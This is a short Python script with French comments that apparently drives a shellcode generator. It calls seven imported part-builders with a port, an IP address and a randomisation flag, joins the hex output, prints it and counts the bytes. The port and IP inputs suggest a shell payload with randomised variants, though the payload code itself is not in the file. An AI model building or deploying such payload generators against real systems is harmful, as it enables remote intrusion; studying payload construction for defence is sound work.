#!/usr/bin/env python3
from choix_part0 import partie0
from choix_part1 import partie1
from choix_part2 import partie2
from choix_part3 import partie3
from choix_part4 import partie4
from choix_part5 import partie5
from choix_part6 import partie6

# Fonction permettant de compter la longueur du shellcode
def count_hexadecimal_bytes(hex_string):
    # Compter le nombre de séquences \x dans la chaîne
    count = hex_string.count('\\x')
    return count

# Fonction principale pour générer le shellcode.
def fn_choix_general(port, ip, fullrdm):

    result_part0 = partie0()
    result_part1 = partie1(fullrdm)  
    result_part2 = partie2(port, ip, fullrdm)  
    result_part3 = partie3(fullrdm)  
    result_part4 = partie4(fullrdm)
    result_part5 = partie5(fullrdm) 
    result_part6 = partie6(fullrdm)  

    # Concatenation des résultats
    concatenated_result = result_part0 + result_part1 + result_part2 + result_part3 + result_part4 + result_part5 + result_part6

    print("")
    print("")
    print(concatenated_result)

    # Compter et afficher le nombre d'hexadécimaux
    num_hex = count_hexadecimal_bytes(concatenated_result)
    print("")
    print("")
    print(f"Le nombre d'hexadécimaux dans la chaîne est : {num_hex}")